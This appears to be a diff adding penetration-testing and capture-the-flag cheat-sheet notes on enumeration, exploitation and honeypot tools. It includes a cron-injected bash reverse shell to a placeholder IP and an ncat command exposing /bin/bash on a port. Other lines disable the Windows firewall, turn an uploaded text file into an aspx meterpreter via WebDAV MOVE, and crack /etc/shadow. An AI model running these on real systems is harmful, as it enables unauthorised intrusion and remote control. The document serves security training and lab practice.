+ * To find IPv6 from SNMP 
+
+  :: 
+
+   snmpwalk -v2c -c public prism 1.3.6.1.2.1.4.34.1.3    
+   iso.3.6.1.2.1.4.34.1.3.2.48.1.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 335544320
+   iso.3.6.1.2.1.4.34.1.3.2.48.2.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 335544321
+   iso.3.6.1.2.1.4.34.1.3.2.48.2.18.52.86.120.171.205.0.0.0.0.0.0.0.1 = INTEGER: 335544323
+
+  Now, convert the decimal value after "iso.3.6.1.2.1.4.34.1.3.2" to hex which would be your IPv6 address "3002:1234:5678:ABCD::1"
+
+ .. ToDo ::  Mention examples for IPv6 connect
+
+* Disable windows firewall 
+
+  ::
+
+   netsh firewall set opmode disable
+
+* Port 139 Open
+
+ :: 
+
+   smbclient -N -L 192.168.1.2 WARNING: The "syslog" option is deprecated
+   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
+
+   Sharename       Type      Comment
+   ---------       ----      -------
+   print$          Disk      Printer Drivers
+   kathy           Disk      Fred, What are we doing here?
+   tmp             Disk      All temporary files should be stored here
+   IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
+
+   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
+
+   Server               Comment
+   ---------            -------
+   RED                  red server (Samba, Ubuntu)
+
+   Workgroup            Master
+   ---------            -------
+   WORKGROUP            RED
+
+   -N : If specified, this parameter suppresses the normal password prompt from the client to the user. This is useful when accessing a service that does not require a password. -L\|--list This option allows you to look at what services are available on a server. You use it as smbclient
+   -L host and a list should appear. The -I option may be useful if your NetBIOS names don't match your TCP/IP DNS host names or if you are trying to reach a host on another network.
+
+
+ If you want to access the share you might want to type
+
+ :: 
+
+   smbclient \\\\IP\\share\_name
+
+ So, in the above example, it would be
+
+ ::
+
+   smbclient \\\\192.168.1.2\\kathy
+
+ If port 139 is open, also run enum4linux, may be it would help get the user list
+    
+    
+
+
+* Port 69 UDP:
+
+  TFTP
+
+  :: 
+
+   get or put file
+
+* Want to see what firewall rules are applied in Linux? Get /etc/iptables/rules.v4 and /etc/iptables/rules.v6 file. 
+	    
+* Ruby Best way to get quoted words / phrases out of the text
+
+  :: 
+
+    text.scan(/"([^"]\*)"/)
+
+    
+* Convert all text in a file from UPPER to lowercase
+	
+  :: 
+
+   tr '[:upper:]' '[:lower:]' < input.txt > output.txt
+
+
+* Remove lines longer than x or shorter than x
+
+  :: 
+
+   awk 'length($0)>x' filename or awk 'length($0)
+
+* Remember, by default cewl generates a worldlist of one word. It by default ignore words in quotes. For example: if "Policy of Truth" is written in quotes. It will treat it as three words. However, what we wanted is to consider whole word between the quotes. By doing a small change in the cewl source code, we can get all the words in quotes, we also can remove spaces and changing upper to lower, we were able to create a small wordlist.
+
+ 
+* Got a random string: Figure out what it could be? Hex encoded, base64 encoded, md5 hash. Use hash-identifier tool to help you.
+
+* If a machine is running a IIS Server and we have found a way to upload a file. We can try asp web-shell or meterpreter of asp, aspx, aspx-exe executable formats from msfvenom.
+
+* If we get a pcap file which contains 802.11 data and has auth, deauth and eapol key packets, most probably it's a packet-capture done using the wireless attack for WPA-Handshake. Use aircrack to see if there is any WPA handshake present.
+
+ :: 
+
+   13:06:21.922176 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
+   13:06:21.922688 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
+   13:06:21.923157 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
+   13:06:21.924224 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
+   13:06:21.924736 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
+   13:06:21.925723 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
+   13:06:21.933402 Probe Response (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit] CH: 11, PRIVACY
+   13:06:21.933908 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
+   13:06:21.934427 Clear-To-Send RA:e0:3e:44:04:52:75 (oui Unknown) 
+   13:06:21.991250 Authentication (Open System)-1: Successful
+   13:06:21.992274 Authentication (Open System)-1: Successful
+   13:06:21.992282 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
+   13:06:21.992795 Authentication (Open System)-2: 
+   13:06:21.992787 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
+   13:06:21.994834 Assoc Request (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit]
+   13:06:21.994843 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
+   13:06:21.996890 Assoc Response AID(1) : PRIVACY : Successful
+   13:06:21.996882 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
+   13:06:22.011783 Action (e8:50:8b:20:52:75 (oui Unknown)): BA ADDBA Response
+   13:06:22.012314 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
+   13:06:22.012827 BAR RA:e8:50:8b:20:52:75 (oui Unknown) TA:c4:12:f5:0d:5e:95 (oui Unknown) CTL(4) SEQ(0) 
+   13:06:22.013330 BA RA:c4:12:f5:0d:5e:95 (oui Unknown) 
+   13:06:22.014874 CF +QoS EAPOL key (3) v2, len 117
+   13:06:22.015379 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
+   13:06:22.030226 CF +QoS EAPOL key (3) v1, len 117
+   13:06:22.030746 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
+   13:06:22.043034 CF +QoS EAPOL key (3) v2, len 175
+   13:06:22.043026 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
+   13:06:22.054803 CF +QoS EAPOL key (3) v1, len 95
+   13:06:22.056338 CF +QoS EAPOL key (3) v1, len 95
+   13:06:22.056859 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
+   13:06:22.064514 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
+   13:06:22.065030 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
+   13:06:22.079878 Clear-To-Send RA:18:f6:43:9c:dc:5f (oui Unknown) 
+   13:06:22.080901 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
+   13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
+   13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
+   13:06:22.110144 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
+
+* Transfer an image
+	
+ :: 
+
+   base64 flair.jpg 
+   Copy output 
+   vi flair 
+   Paste the clipboard 
+   base64 -d flair > flair.jpg
+
+* Have a web-accessible git ? utilize `dvcs-ripper <https://github.com/kost/dvcs-ripper>`_ to rip web accessible (distributed) version control systems: SVN, GIT, Mercurial/hg, bzr. It can rip repositories even when directory browsing is turned off. Eric Gruber has written a blog on `Dumping Git Data from Misconfigured Web Servers <https://blog.netspi.com/dumping-git-data-from-misconfigured-web-servers/>`_ providing good walkthru.
+
+* It's always important to find, what's installed on the box:
+
+ :: 
+
+   dpkg-query -l 
+
+ or using wild cards
+
+ :: 
+
+   dpkg-query -l 'perl*'
+
+* It's always important to note down all the passwords found during the process of exploiting a vulnerable machine as there is a great possibility that passwords would be reused.
+ 
+* If you have .jar file, Probably use jd-gui to decompile and view the class file. 
+
+
+* Find recently modified files:
+
+  ::
+
+   find / -mmin -10 -type f 2>/dev/null
+
+  The above will show you which files have been modified within the last 10 minutes, which could help you find out whether an important config file, or log file has been modified.
+
+* Getting a reverse shell from:
+
+ * Drupal: Now that we have access to the Drupal administration panel, we can gain RCE by enabling the PHP filter module. This will allow us to execute arbitrary code on the site by inserting a specifically crafted string into page content. After enabling the module, I proceed to allow code to be executed by all users under the configuration screen for the module. Once enabled we need to give permission to use it so in people -> permissions check "Use the PHP code text for. 
+   
+   Next, we create a new block (by going to Blocks, under the Structure menu) with the following content. We make sure to select PHP code from the Text format drop down. Taken from `Droopy Vulnhub WriteUp <https://g0blin.co.uk/droopy-vulnhub-writeup/>`_
+   Drupal settings file location: /var/www/html/sites/default/settings.php
+ 
+ * WordPress : If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance > Editor > Possibly edit 404 Template.
+
+* If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy. Probably, squid proxy server would be running. If it is the squid configuration file is /etc/squid/squid.conf
+ 
+ * If you do get the configuration file, do check for what kind of proxy it is! like SOCKS4, SOCKS5 or HTTP(S) proxy and is there any authentication required to access the proxy. 
+ * We may utilize `Proxychains <https://github.com/haad/proxychains>`_ to access the other side of network like ssh, http etc. 
+
+* Running Asterisk/ Elastix/ FreePBX or any PBX, probably try `SIPVicious <https://github.com/EnableSecurity/sipvicious>`_  suite is a set of tools that can be used to audit SIP based VoIP systems. Running "http:\\IP\panel" should provide us valid extensions.
+
+* Sharepoint running? Probably, check `SPartan <https://github.com/sensepost/SPartan>`_ Frontpage and Sharepoint fingerprinting and attack tool and `SharePwn <https://github.com/0rigen/SharePwn>`_ SharePoint Security Auditor.
+
+* authbind software allows a program that would normally require superuser privileges to access privileged network services to run as a non-privileged user. authbind allows the system administrator to permit specific users and groups access to bind to TCP and UDP ports below 1024.
+
+* Mostly, if there's only port open like ssh and the IP might be acting as a interface between two networks? Like IT and OT. Probably, try to add that IP address as a default route? As it might be acting as a router?
+
+* If you are trying to figure out the hostname of the machine and the DNS-Server is not configured, may be try to do a Full Nmap Scan -A Option? (Still need to figure out how does that work)
+
+* Want to send a email via the SMTP server something like SMTP-Open-Relay utilize `Swaks <http://www.jetmore.org/john/code/swaks/>`_ Swiss Army Knife for SMTP.
+
+  ::
+
+   swaks --to xxxxx@example.com --from xxxxxee@example.edu --server 192.168.110.105:2525 --body "Hey Buddy How are you doing" --header "Subject: Hello! Long time"
+
+* Got /etc/shadow file?, utilize /etc/passwd with unshadow command and use john or cudahashcat to crack passwords.
+
+ ::
+
+  unshadow passwd shadown
+
+* If IIS and WebDav with PUT and MOVE method are enabled, we can use testdav or cadaver (A command-line WebDAV client for Unix) to see which files are allowed
+
+ ::
+
+  davtest -url http://10.54.98.15/
+  ********************************************************
+   Testing DAV connection
+  OPEN		SUCCEED:		http://10.54.98.15
+  ********************************************************
+  NOTE	Random string for this session: E3u9ISnNswYes0
+  ********************************************************
+   Creating directory
+  MKCOL		SUCCEED:		Created http://10.54.98.15/DavTestDir_E3u9ISnNswYes0
+  ********************************************************
+   Sending test files
+  PUT	pl	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.pl
+  PUT	asp	FAIL
+  PUT	aspx	FAIL
+  PUT	cgi	FAIL
+  PUT	html	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+  PUT	cfm	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.cfm
+  PUT	jhtml	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jhtml
+  PUT	shtml	FAIL
+  PUT	php	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.php
+  PUT	jsp	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jsp
+  PUT	txt	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+  ********************************************************
+   Checking for test file execution
+  EXEC	pl	FAIL
+  EXEC	html	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+  EXEC	cfm	FAIL
+  EXEC	jhtml	FAIL
+  EXEC	php	FAIL
+  EXEC	jsp	FAIL
+  EXEC	txt	SUCCEED:	http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+  
+  ********************************************************
+  /usr/bin/davtest Summary:
+  Created: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0
+  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.pl
+  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.cfm
+  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jhtml
+  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.php
+  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jsp
+  PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+  Executes: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+  Executes: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+ 
+ Now, we can see that pl, html, txt and other files can be uploaded. Now, if the MOVE method is enabled, we can upload a aspx meterpreter in a text file and then MOVE the .txt file to .aspx and execute the aspx file by using
+
+ ::
+
+  MOVE /shell.txt HTTP/1.1
+  Host: example.com
+  Destination: /shell.aspx
+
+* In one of the VM, one of the task was to capture the RAM of the system by using LiME ~ Linux Memory Extractor ( which is executed by suid binary with root privileges ). Let's say the ramdump was saved at
+
+  ::
+
+   /tmp/ramdump
+
+  If, you create a symlink from /tmp/ramdump to /etc/crontab
+
+  ::
+
+   ln -s /etc/crontab /tmp/ramdump
+
+  Now, when the ramdump is taken, lime will now dump the content of RAM straight into /etc/crontab. As crontab will ignore everything which doesn’t match the correct syntax. If the memory contains a injected string such as 
+
+  ::
+
+   cat cron.py
+   print "* * * * * root /bin/bash /home/username/evilscript"
+  
+  the injected string will end up in /etc/crontab will be executed.
+
+  The contents of evilscript can be
+
+  ::
+
+   /bin/bash -i >& /dev/tcp/IP/Port 0>&1
+
+  which will provide the root shell to the attacker. Thanks to TheColonial :)
+
+* `phpbash <https://github.com/Arrexel/phpbash>`_ is a standalone, semi-interactive web shell. It's main purpose is to assist in penetration tests where traditional reverse shells are not possible.
+
+* ps aux not fully visible try 
+
+  ::
+
+   echo "`ps aux --sort -rss`"
+
+* If there's a XXE on a website and possible RFI using internal address i.e on http://127.0.0.1:80/home=RFI rather than http://10.54.98.10:80/home=RFI, utilize XXE to send the request with localaddress.
+
+* If there's a possible command execution on a website such as 
+
+  ::
+
+   curl -A "bitvijays" -i "http://IPAddress/example?parameter='linux_command'"
+
+  However, it is protected by a WAF, probably, try bash globbling techniques with ? and \*. Refer `Web Application Firewall (WAF) Evasion Techniques <https://medium.com/secjuice/waf-evasion-techniques-718026d693d8>`_ and `Web Application Firewall (WAF) Evasion Techniques #2 <https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0>`_ ! Amazing stuff here!
+  Also, it might be a good idea to test the command with ? on your local machine first then directly on the target. Also, sometimes, it adding a space before or after the linux_command might work like ' linux_command' or 'linux_command '
+
+* Similar to ls there is dir in linux. Try "dir -l" Might be helpful sometimes.
+
+* Sometimes, we don't have tools on the victim machine, in that case we can download static binaries from `Static-Binaries <https://github.com/andrew-d/static-binaries>`_ If not, found, try the deb or rpm package of the binary, extract it and upload.
+
+* mysql can execute statements in one liner using --execute or -e option
+
+  ::
+
+   mysql [options] db_name
+   --user=user_name, -u user_name  : The MariaDB user name to use when connecting to the server.
+   --password[=password], -p[password] : The password to use when connecting to the server. If you use the short option form (-p), you cannot have a space between the option and the password. If you omit the password value following the --password or -p option on the command line, mysql
+           prompts for one.
+   --execute=statement, -e statement : Execute the statement and quit. Disables --force and history file. The default output format is like that produced with --batch.
+
+* If there's .action file present in the URL on a Apache WebServer, `Apache Struts <https://svn.apache.org/repos/asf/struts/archive/trunk/struts-doc-1.1/api/org/apache/struts/action/package-summary.html>`_ might be installed on it. Check for Apache Struts vulnerabilities on it.
+
+* Windows XP Machine ? and we are able to put some files anywhere? Refer `Playing with MOF files on Windows, for fun & profit <http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html>`_
+
+* Good Post Exploitation Guide `Windows Post-Exploitation Command List <http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf>`_
+
+* Oracle Padding Attacks? Refer `PadBuster <https://github.com/GDSSecurity/PadBuster>`_ 
+
+* If there's a cron job with 
+
+ ::
+
+  * * * * * php /path-to-your-project/artisan schedule:run >> /dev/null 2>&1
+
+ possibly, we can edit schedule method of the App\Console\Kernel class (Kernel.php) in App\Console\Kernel and use exec method to execute commands on the operating systems.
+
+ ::
+
+  $schedule->exec('node /home/forge/script.js')->daily();
+
+ Refer `Task Scheduling <https://laravel.com/docs/5.6/scheduling>`_ 
+
+* Handy Stuff
+
+ * Utilize xxd to convert hex to ascii
+
+  ::
+
+   xxd -r -p
+   -p | -ps | -postscript | -plain : output in postscript continuous hexdump style. Also known as plain hexdump style.
+   -r | -revert : reverse operation: convert (or patch) hexdump into binary.  If not writing to stdout, xxd writes into its output file without truncating it. Use the combination -r -p to read plain hexadecimal dumps without line number information and without a particular column layout. Additional Whitespace and line-breaks are allowed anywhere.
+
+ * We may use base64 -w 0 to disable line wrapping while encoding files with base64.
+ * Use python
+
+  * binascii.unhexlify(hexstr) to convert hex to string
+  * base64.decodestring(str) to decode base64 string
+  * Convert number to hex
+
+   :: 
+     
+      hex(15)
+      '0xf'
+
+  * Convert hex to decimal
+
+   ::
+
+    s = "6a48f82d8e828ce82b82"
+    i = int(s, 16)
+
+  * If we are able to execute python code maybe use popen to execute os commands.
+   
+   ::
+
+    import os;
+    os.popen("whoami").read()
+    
+ * Getting out of more
+  
+  If in somecase, we are unable to ssh into the machine or being logged out when trying ssh, check the /etc/passwd file for the shell defined for that user.
+
+  ::
+   
+    cat /etc/passwd | grep user1
+    user1:x:11026:11026:user level 1:/home/user1:/usr/bin/showtext
+
+  Here Instead of /bin/bash, user1 is using /usr/bin/showtext, which is apparently not a shell. Let’s look at the content of the file
+
+  ::
+
+    cat /usr/bin/showtext
+    #!/bin/sh
+    more ~/text.txt
+    exit 0
+
+  In such cases, First, minimize your terminal so that when we are logged into user1 via ssh command, the large text will force a “more” message to prompt us to continue the output. Now that we have forced the terminal to prompt us to continue the display via “more” or “–More–(50%)” in this case, press “v” to enter “vim”, a built-in text editor on Unix machines. Once, we have vim interface, use :shell to get a shell.
+
+ * List all the files together
+
+  ::
+
+   find /home -type f -printf "%f\t%p\t%u\%g\t%m\n" 2>/dev/null | column -t
+ 
+
+Cyber-Deception
+===============
+
+Wordpot
+-------
+
+`Wordpot <https://github.com/gbrindisi/wordpot>`_ : Wordpot is a Wordpress honeypot which detects probes for plugins, themes, timthumb and other common files used to fingerprint a wordpress installation.
+
+::
+
+ python /opt/wp/wordpot.py --host=$lanip --port=69 --title=Welcome to XXXXXXX Blog Beta --ver=1.0 --server=XXXXXXXWordpress
+
+FakeSMTP
+--------
+
+`FakeSMTP <http://nilhcem.com/FakeSMTP/>`_ : FakeSMTP is a Free Fake SMTP Server with GUI for testing emails in applications easily.
+
+::
+
+  java -jar /opt/fakesmtp/target/fakeSMTP-2.1-SNAPSHOT.jar -s -b -p 2525 127.0.0.1 -o /home/username
+
+Rubberglue
+----------
+
+`Rubberglue <https://github.com/adhdproject/adhdproject.github.io/blob/master/Tools/Rubberglue.md>`_ : We can use Rubberglue to listen on a port such that any traffic it receives on that port it will forward back to the client ( attacker ) on the same port.
+
+::
+
+  python2 /opt/honeyports/honeyports-0.4.py -p 23
+
+Knockd
+------
+
+`Knockd - Port-knocking server <http://www.zeroflux.org/projects/knock>`_ : knockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special "knock" sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open -- since knockd listens at the link-layer level, it sees all traffic even if it's destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.
+
+If there is port knocking involved, read the /etc/knockd.conf, read the sequence port knock should be done and execute
+
+::
+
+ for PORT in 43059 22435 17432; do nmap -PN 192.168.56.203 -p $PORT; done
+
+DCEPT
+-----
+
+SecureWorks researchers have created a solution known as `DCEPT (Domain Controller Enticing Password Tripwire) <https://www.secureworks.com/blog/dcept>`_ to detect network intrusions. Github is `dcept <https://github.com/secureworks/dcept>`_ 
+
+Useful Tools
+============
+
+* `exe2hex <https://github.com/g0tmi1k/exe2hex>`_ : Inline file transfer using in-built Windows tools (DEBUG.exe or PowerShell). 
+
+* `Powercat <https://github.com/secabstraction/PowerCat>`_ : A PowerShell TCP/IP swiss army knife that works with Netcat & Ncat
+
+* `Unicorn <https://github.com/trustedsec/unicorn>`_ is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory.
+
+* `Nishang <https://github.com/samratashok/nishang>`_ is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming.
+
+* `Ncat <https://nmap.org/book/ncat-man-examples.html>`_ Ncat is a feature-packed networking utility which reads and writes data across networks from the command line. Ncat was written for the Nmap Project and is the culmination of the currently splintered family of Netcat incarnations. It is designed to be a reliable back-end tool to instantly provide network connectivity to other applications and users. Ncat will not only work with IPv4 and IPv6 but provides the user with a virtually limitless number of potential uses. 
+  Among Ncat's vast number of features there is the ability to chain Ncats together; redirection of TCP, UDP, and SCTP ports to other sites; SSL support; and proxy connections via SOCKS4, SOCKS5 or HTTP proxies (with optional proxy authentication as well). Some general principles apply to most applications and thus give you the capability of instantly adding networking support to software that would normally never support it.
+ 
+ Few important example is 
+
+ Redirect any incoming traffic on TCP port 8080 on the local machine to host (example.org -in below example) on port 80.
+
+ ::
+
+  ncat --sh-exec "ncat example.org 80" -l 8080 --keep-open
+
+ Bind to TCP port 8081 and attach /bin/bash for the world to access freely.
+
+ ::
+
+  ncat --exec "/bin/bash" -l 8081 --keep-open""
